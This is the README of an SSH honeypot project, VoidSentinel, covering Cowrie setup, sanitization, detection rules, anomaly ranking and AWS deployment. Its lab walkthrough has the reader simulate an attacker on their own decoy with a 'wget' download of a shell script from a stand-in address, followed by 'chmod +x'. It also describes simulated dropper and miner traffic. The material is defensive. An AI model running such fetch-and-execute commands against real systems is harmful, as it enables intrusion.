# VoidSentinel — Cloud SSH Honeypot and AI-Assisted Threat Analysis

VoidSentinel collects activity from an isolated SSH decoy (Cowrie), rebuilds every session, flags what deserves attention with explainable rules, ranks unusual sessions with an Isolation Forest, and gives an analyst a private dashboard to inspect timelines and record verdicts. It also measures whether the ML ranking actually improves triage.

```
 attacker ──ssh:22──▶ Cowrie on EC2 ──▶ collector (sanitize) ──▶ CloudWatch Logs
   (isolated VPC, egress locked to VPC endpoints)                      │
                                                                       ▼
                    private analysis host:  worker ──▶ SQLite ◀── FastAPI ◀── dashboard (127.0.0.1)
```

The same collector, worker, API and dashboard run in two modes:

| Mode | Decoy | Transport | Use it for |
|---|---|---|---|
| **Lab** | Cowrie in Docker on your machine (127.0.0.1:2222) | local JSONL file | Phase 1: build, demo, develop |
| **Cloud** | Cowrie on an isolated EC2 sensor | CloudWatch Logs | Phase 2+: real internet telemetry, evaluation |
| **Dataset Import** | Historical Cowrie SSH/Telnet logs (yours or published datasets) | file upload | Offline analysis before the AWS sensor runs |

Nothing in either mode is synthetic: every session in the dashboard is a real SSH connection handled by Cowrie.

---

## Repository layout

```
backend/                 FastAPI API + ingestion worker (Python 3.12)
  voidsentinel/
    sanitize.py          field allowlist + command redaction (same code as the sensor)
    sources.py           file source (lab) / CloudWatch source with checkpoint + overlap
    sessions.py          event storage (dedup by event ID) + session reconstruction
    rules.py             10 detection rules, each with reason + evidence event IDs
    categories.py        command → behaviour categories
    ml.py                Isolation Forest: features, training, scoring, explanations
    evaluation.py        rules vs rules+ML at equal review budget, time-split
    importer.py          Dataset Import: readers, validation, preview, import pipeline, CLI
    worker.py            single-writer ingestion loop
    api.py               REST API for the dashboard
  tests/                 pytest unit tests
frontend/                React + Vite + TypeScript + Tailwind + Recharts dashboard
sensor/
  collector/             collector.py + sanitize.py (runs on the sensor / in the lab)
  systemd/               cowrie.service, voidsentinel-collector.service
  scripts/validate_egress.sh
infra/terraform/         AWS: isolated sensor VPC, endpoints, IAM, EC2, logs, budget
tools/lab_sessions.py    controlled SSH test traffic for your own decoy
datasets/                drop large logs here for the command-line importer
docker-compose.yml       analysis stack (+ lab profile with Cowrie and collector)
docker-compose.cloud.yml override that switches the worker to CloudWatch
```

---

## 1. Lab quick start (≈5 minutes)

**Prerequisites:** Docker Desktop (Windows/macOS) or Docker Engine + Compose v2 (Linux). Python 3.10+ only if you want the traffic tool.

```bash
cp .env.example .env                          # Windows PowerShell: copy .env.example .env
docker compose --profile lab up -d --build
docker compose ps                             # api should show "healthy"
```

Open **http://127.0.0.1:8081** and sign in. The first start creates two accounts from `.env`:

| Role | Username | Password (change it) | Can |
|---|---|---|---|
| Admin | `admin` | `Admin#2026-change-me` | everything an analyst can, plus import datasets, retrain models, manage access |
| Analyst | `analyst` | `Analyst#2026-change-me` | view telemetry, investigate alerts, record verdicts |

Change these in `.env` before the first start, or afterwards on the **Access** page. If you leave a password empty, one is generated and shown once in `docker compose logs api`.

Now attack your own decoy. Cowrie accepts `root` with any password except `root` and `123456`:

```bash
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@127.0.0.1
# try password "root" first (fails), then e.g. "letmein" (accepted)
uname -a
cat /proc/cpuinfo
wget http://203.0.113.10/x.sh
chmod +x x.sh
exit
```

Within a few seconds the session appears under **Sessions**, its rule findings under **Alert queue**, and the timeline shows each event with the evidence for each alert highlighted. Record a verdict on the session page.

### Demo script (about 3 minutes)

1. **Sign in as analyst.** The strip at the top of every page shows *Source · Local lab sensor* and *Traffic · Demo*.
2. **Alert queue → View evidence** on a critical alert. The SSH session opens with the triggering events highlighted and the rule's threshold beside the alert.
3. **Save a verdict** with a short note. The confirmation says how many alerts moved to **Triaged**; refresh to show it persisted, then open the Triaged tab.
4. **Sign out, sign in as admin → Import dataset.** Upload a Cowrie file, review the preview (accepted/rejected rows, passwords stripped), click **Import and analyze**, then **View imported analysis**.
5. Open one of the dataset's alerts, inspect its SSH session, and save a verdict. Every page now shows *Source · Imported: <name>*.

**More controlled traffic** (needed for the anomaly model, which trains after 30 completed sessions):

```bash
pip install paramiko==3.4.1
python tools/lab_sessions.py --host 127.0.0.1 --port 2222 --sessions 40
```

It opens real SSH sessions that behave like scanners, brute-forcers, recon bots, droppers, persistence and miner attempts. Because they come from your machine they are tagged **demo** and are always excluded from the ML evaluation.

Useful commands:

```bash
docker compose logs -f worker collector      # watch ingestion
docker compose run --rm api python -m pytest -q   # unit tests
docker compose --profile lab down            # stop (data kept in volumes)
docker compose --profile lab down -v         # stop and delete all data
```

### Running without Docker (development)

```bash
# terminal 1 — API
cd backend && python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -r requirements.txt
export VS_DATA_DIR=./data VS_SHIPPED_FILE=./data/events.jsonl VS_DEMO_SOURCE_CIDRS=127.0.0.0/8 VS_ML_INCLUDE_DEMO=true
uvicorn voidsentinel.api:app --host 127.0.0.1 --port 8000

# terminal 2 — worker (same env vars)
python -m voidsentinel.worker

# terminal 3 — collector, pointed at a Cowrie you run locally
cd sensor/collector
COWRIE_LOG=/path/to/cowrie/var/log/cowrie/cowrie.json SINK=file SINK_FILE=../../backend/data/events.jsonl \
STATE_FILE=./state.json SENSOR_NAME=lab-sensor python collector.py

# terminal 4 — dashboard with hot reload (proxies /api to :8000)
cd frontend && npm install && npm run dev      # http://127.0.0.1:8081 (stop the Docker web container first)
```

---

## 1b. Dataset Import (offline analysis of historical Cowrie logs)

Analyze an existing Cowrie log with the same session timeline, detection rules and anomaly ranking used for live traffic. Each import becomes its own **data source**, selectable in the sidebar, and is never mixed with live sensor data. Every page shows a banner while you view a dataset, and each session shows where it came from ("Imported: <name>" or "Live sensor").

**Supported files (one per import):** Cowrie JSON Lines (`cowrie.json`, `.jsonl`, `.log`), a JSON array of events, Elasticsearch-style exports with each event under `_source`, **CSV/TSV** (columns are matched to Cowrie fields automatically and you can adjust the mapping in the preview), and any of these as `.gz` or `.zip`. A `.zip` such as a Kaggle download is scanned for every `.json`, `.jsonl`, `.log`, `.csv` and `cowrie.json*` file inside. Event types written without the `cowrie.` prefix (`login.failed`) are matched to Cowrie events. SSH and Telnet sessions are both handled.

Importing is an **admin** task; analysts can open and investigate any imported dataset.

**Good datasets to start with:** the Kaggle Cowrie SSH/Telnet honeypot datasets (download, then upload the `.zip` or the JSON files inside). Network-flow datasets such as CIC-IDS2017 have no session IDs or commands, so they belong in a different, flow-classification view.

**In the dashboard:** open **Import dataset**, drop the file, and review the validation preview before anything is stored:

- rows read, accepted and rejected, with the reason and line number for each rejection (invalid JSON, no `eventid`, not a `cowrie.*` event, no `session`, no or unparseable `timestamp`);
- the time range, sessions, distinct source IPs, protocols and event types;
- how many captured passwords, `message` fields and terminal-log paths will be stripped, plus the first sanitized rows exactly as they will be saved.

Name the dataset and click **Import and analyze**. The importer stores events (identical duplicate rows once), rebuilds every session, runs all rules (including repeated login failures across connections, checked over the whole history per source), closes sessions that never logged a close, and trains an anomaly model on that dataset alone. Validation and import each run in their own background process, so the dashboard stays responsive and other analysts can keep working (only one import runs at a time). Every row is parsed and sanitized once, during validation; the import then makes a single sequential pass that stores events, builds sessions and runs the rules together, committing every second so live ingestion and verdicts never wait. Dataset dashboards are precomputed at import, so opening a dataset is instant.

Measured on a 1.5-million-event, 16-file Kaggle-style zip (laptop-class CPU): validation about 30 s, full analysis about 100 s (events and sessions 56 s, cross-connection rule 3 s, anomaly ranking 13 s). Expect roughly 10–15k events per second end to end; the preview shows an estimate before you click Import.

**First demo:**

1. Import a Cowrie log.
2. Click **Sessions with repeated failed logins**, open an alert, and the exact failed-login events behind it are highlighted on the timeline.
3. Click **Most unusual sessions** (or Anomaly ranking), open the top session, and **How unusual it is** lists the features that set it apart and the dataset's typical values.

**Labels and evaluation:** published honeypot logs have no reviewed labels, so a dataset starts with anomaly rankings and your verdicts. Once you have marked enough sessions, the evaluation on the Anomaly ranking page computes precision and recall within that dataset.

**Very large files (over 1 GB):** put the file in `./datasets/` and use the command-line importer:

```bash
docker compose exec api python -m voidsentinel.importer /datasets/cowrie.json --preview-only   # validate only
docker compose exec api python -m voidsentinel.importer /datasets/cowrie.json --name "Kaggle Cowrie"
docker compose exec api python -m voidsentinel.importer /datasets/export.csv --map session=session_id --map eventid=event
```

The upload limit for the dashboard is `VS_MAX_UPLOAD_MB` (default 1024). Delete a dataset from the Import page; this removes its events, sessions, alerts, verdicts and model and leaves live data untouched.

---

## 2. Cloud deployment (AWS)

**Prerequisites:** AWS account, AWS CLI v2 configured as an admin for deployment, Terraform ≥ 1.5, the [Session Manager plugin](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html) for the AWS CLI.

> Only run this against infrastructure you own. Exposing a honeypot to the internet is legal in most places but check your institution's and your cloud provider's rules first.

### 2.1 Bootstrap (decoy closed, temporary egress open)

```bash
cd infra/terraform
cp terraform.tfvars.example terraform.tfvars
# edit: allowed_decoy_cidrs = ["<your public IP>/32"]   (curl -s https://checkip.amazonaws.com)
#       budget_email = "you@example.com"
terraform init
terraform apply
```

Wait about 5 minutes, then confirm the sensor finished installing:

```bash
aws ssm start-session --target $(terraform output -raw sensor_instance_id) --region ap-south-1
sudo tail -n 3 /var/log/voidsentinel-bootstrap.log     # expect: "bootstrap complete"
systemctl status cowrie voidsentinel-collector --no-pager
exit
```

### 2.2 Lock down and open the decoy

```bash
terraform apply -var bootstrap_mode=false
```

This removes the temporary internet egress (the sensor can now reach only the CloudWatch Logs and SSM VPC endpoints) and opens port 22 to `allowed_decoy_cidrs`. Port 22 is redirected to Cowrie on 2222; the real sshd is disabled and administration is SSM only.

**Validate the restriction before widening exposure:**

```bash
aws ssm start-session --target $(terraform output -raw sensor_instance_id) --region ap-south-1
sudo /opt/voidsentinel/validate_egress.sh        # every line must be PASS
```

### 2.3 Run the analysis stack against CloudWatch

Create a key for the read-only user Terraform made (kept out of Terraform state):

```bash
aws iam create-access-key --user-name $(terraform output -raw reader_user)
aws configure --profile voidsentinel-reader      # paste the key; region ap-south-1
```

In the project root, edit `.env`:

```
AWS_PROFILE=voidsentinel-reader
AWS_REGION=ap-south-1
VS_DEMO_SOURCE_CIDRS=<your public IP>/32
VS_ML_INCLUDE_DEMO=false
VS_ADMIN_PASSWORD=<a long unique password>
VS_ANALYST_PASSWORD=<a long unique password>
VS_COOKIE_SECURE=true          # if you put the dashboard behind HTTPS
```

Start the stack (no lab profile — the real decoy is in AWS):

```bash
docker compose -f docker-compose.yml -f docker-compose.cloud.yml up -d --build
```

Within a minute **Sensors & rules** shows `sensor-01` with a fresh heartbeat. SSH to `terraform output -raw sensor_public_ip` from your allowed IP to see your own (demo-tagged) session arrive through CloudWatch.

When you are satisfied, widen exposure to collect real attacker traffic: `allowed_decoy_cidrs = ["0.0.0.0/0"]`, then `terraform apply -var bootstrap_mode=false`.

**Optional private analysis host:** set `create_analysis_host = true`. It has no inbound rules at all. SSM in, `git clone` your repo, create `.env` (no AWS keys needed — the instance role is used), start the cloud stack, and forward the dashboard to your laptop:

```bash
aws ssm start-session --target $(terraform output -raw analysis_instance_id) \
  --document-name AWS-StartPortForwardingSession --parameters '{"portNumber":["8081"],"localPortNumber":["8081"]}'
```

### 2.4 Costs and teardown

Approximate always-on cost in ap-south-1: the t3.small sensor, four interface endpoints (each billed hourly plus per-GB), CloudWatch ingestion/storage, and a second t3.small if you create the analysis host. Expect tens of USD per month; check the AWS Pricing Calculator for current figures. Budget notifications can arrive after charges accrue.

```bash
terraform destroy          # removes everything, including the log group
```

---

## 3. How the pieces fit

**Sanitization (on the sensor, and again in the worker).** Only allowlisted Cowrie fields leave the sensor. Cowrie writes captured passwords into both `password` and the free-text `message` field of login events — both are dropped, as are terminal recordings (`ttylog`) and forwarded payloads. Command text has obvious secrets (`chpasswd` input, `password=…`, SSH keys, long base64/hex blobs) redacted and is truncated to 300 characters. The dashboard renders it as plain text only.

**Reliable transport.** The collector advances its read offset only after the sink accepts a batch, and stamps each record with a deterministic `vs_uid`. CloudWatch timestamps are set at ship time, so the worker's checkpoint plus a 10-minute overlap never skips late-shipped events; duplicates are ignored by `vs_uid`. Restarting the worker re-reads safely.

**Heartbeat.** Every minute the collector ships a heartbeat. *Quiet* = heartbeat fresh, no attacker events for an hour (normal). *Stalled* = no heartbeat for 3 minutes (check the sensor).

**Sessions.** Rebuilt from all of a session's events every time one arrives, so out-of-order delivery can't corrupt them. Outcomes: left before login, login failures only, logged in with no commands, ran commands.

**Rules** (all show their reason, their trigger threshold, a MITRE ATT&CK reference where one fits, and link to evidence events): password guessing in one connection, repeated login failures across connections from one source, interactive access, payload download, download-then-execute (critical), persistence, account tampering (incl. Cowrie's `chpasswd` event), miner indicators, history/log tampering, reconnaissance bursts. Thresholds are set in `.env`.

**Anomaly ranking.** Features you can verify from the timeline: duration, failed logins, logged in, command count, distinct command categories, time to first command, mean gap between events, event count. Isolation Forest (scikit-learn) trains on completed sessions once 30 exist and retrains when the pool grows 25% or every 6 hours. Each score is a percentile against the training set and lists the features that deviate most from the baseline median. It measures unusualness, not maliciousness, and is shown separately from rule severity.

**Evaluation** (Anomaly ranking page). Split completed non-demo sessions at a date, train a fresh model only on the earlier part, then for each later week let *rules only* (alerted sessions by severity) and *rules + ML* (severity + anomaly percentile) each pick the same budget of sessions. Report how many reviewed picks were worth investigating, how many the ML found with no rule firing, recall against all sessions you marked worth investigating, and unreviewed picks. Review sessions in the test period before drawing conclusions.

## 3b. Sign-in and roles

Every API route except `/api/health` requires sign-in, and permissions are enforced by the API, not just hidden in the UI.

| | Analyst | Admin |
|---|---|---|
| View telemetry, alerts, SSH sessions, anomaly ranking | ✓ | ✓ |
| Record verdicts (stored with your username) | ✓ | ✓ |
| Import or delete datasets, retrain models | | ✓ |
| Add people, change roles, reset passwords, disable accounts (Access page) | | ✓ |

Sessions are server-side: the browser holds only a random token in an `HttpOnly`, `SameSite=Strict` cookie (`Secure` when served over HTTPS; set `VS_COOKIE_SECURE=true` behind a TLS proxy). They expire after `VS_SESSION_HOURS` (8) or `VS_SESSION_IDLE_MINUTES` (120) of inactivity, and signing out deletes the server-side session, so a copied cookie stops working. Passwords are hashed with scrypt; five failed sign-ins from one address lock that username for 15 minutes. Changing someone's role or password, or disabling them, signs them out everywhere immediately.

## 4. Acceptance checklist

| Phase | Check | How |
|---|---|---|
| 0. Startup | `docker compose --profile lab up -d --build` serves the dashboard at http://127.0.0.1:8081 | no port override needed |
| Sign-in | Signed-out users see the sign-in page (direct links too); refresh keeps you signed in; analysts get 403 on admin API calls | Demo script steps 1 and 4 |
| 1. Working lab | A controlled SSH session shows connect → login → commands → close in order | Lab quick start, open the session |
| 2. Cloud telemetry | Events arrive after a worker restart with no duplicate rows | `docker compose restart worker`; event and session counts don't jump |
| | Dashboard private | bound to `127.0.0.1:8081` only; every API route except health requires sign-in |
| | Sensor egress restricted | `validate_egress.sh` all PASS |
| | No passwords exported | CloudWatch console: search the log group for a password you used — no hits |
| 3. Triage | Every alert opens its evidence | Alert queue → click → highlighted events |
| | Quiet vs stalled | Stop the collector (`sudo systemctl stop voidsentinel-collector`) → *stalled* within 3 min |
| | Verdict persists and the alert moves to Triaged | Demo script step 3 |
| Import | A small Cowrie file's counts, timeline and expected rule finding match the file; malformed or zero-valid files show a clear error | Demo script steps 4–5 |
| 4. ML evaluation | Reproducible comparison at equal budget | Anomaly ranking: the form previews eligible range (your timezone), train/test split and verdict counts before you run |

## 5. Troubleshooting

- **Dashboard says the API is unreachable:** `docker compose ps`; `docker compose logs api`.
- **Lab sessions never appear:** `docker compose logs collector` should show `shipped N events`. If it can't find the log, check `docker compose exec cowrie ls var/log/cowrie`.
- **`ssh: connection refused` on 2222:** Cowrie takes ~10 s to start; `docker compose logs cowrie`.
- **Cloud: sensor shows "unknown"/"stalled":** on the sensor, `journalctl -u voidsentinel-collector -n 50`. AccessDenied means the log stream name doesn't match `sensor_name`. Timeouts usually mean the endpoint SG or private DNS is wrong; `getent hosts logs.ap-south-1.amazonaws.com` must give a 10.50.x.x address.
- **Worker shows a CloudWatch read error:** confirm `AWS_PROFILE`/keys in `.env` and that `~/.aws` exists on the host running Docker.
- **An import looks stuck:** the progress line shows rows processed and updates every second. If it stops changing, check `docker compose exec api sh -c 'tail -n 30 /data/uploads/*/.import.log'`. An import interrupted by a restart is marked failed; delete it and import again.
- **"The database is busy":** a heavy import step was finishing a write. The message is safe to retry after a few seconds; nothing was lost.
- **Anomaly column is empty:** the baseline needs 30 completed sessions; in the lab set `VS_ML_INCLUDE_DEMO=true` and run the traffic tool.
- **Windows:** use PowerShell; `ssh` is built into Windows 10/11. Replace `export` with `$env:NAME="value"` in the non-Docker instructions.
